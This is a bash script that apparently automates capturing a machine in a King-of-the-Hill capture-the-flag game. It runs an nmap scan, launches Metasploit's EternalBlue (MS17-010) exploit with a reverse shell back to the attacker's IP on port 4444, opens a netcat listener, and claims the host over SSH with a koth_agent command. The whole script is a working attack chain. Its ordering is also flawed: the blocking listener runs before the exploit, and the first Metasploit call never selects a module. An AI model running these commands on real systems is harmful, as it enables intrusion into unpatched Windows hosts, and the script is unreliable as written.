#!/bin/bash

# Variables
target_ip="10.0.254.195"  # Change this to your target machine IP
reverse_shell_port="4444"
your_ip="192.168.1.100"  # Replace with your IP

echo "Starting the process to capture the machine at $target_ip..."

# Step 1: Nmap Scan to find open ports and services
echo "[+] Running Nmap scan on $target_ip..."
nmap -A $target_ip -oN nmap_scan_results.txt

# Step 2: Check for vulnerabilities (Example: EternalBlue)
echo "[+] Searching for potential vulnerabilities..."
msfconsole -q -x "search smb ms17_010; set RHOSTS $target_ip; set LHOST $your_ip; exploit"

# Step 3: Start a Netcat listener for a reverse shell
echo "[+] Setting up Netcat listener on port $reverse_shell_port..."
nc -lvp $reverse_shell_port

# Step 4: Execute reverse shell payload on target using Metasploit
# Assume that a vulnerability was found, for example, EternalBlue.
# Adjust exploit and target information accordingly.

msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $target_ip;
set LHOST $your_ip;
set LPORT $reverse_shell_port;
exploit"

# Step 5: Capture the machine using the KOTH agent
claim_code="your_claim_code_here"  # Replace with your actual claim code
sshpass -p 'your_password' ssh user@$target_ip "sudo /usr/bin/koth_agent $claim_code"

echo "[+] Machine captured successfully!"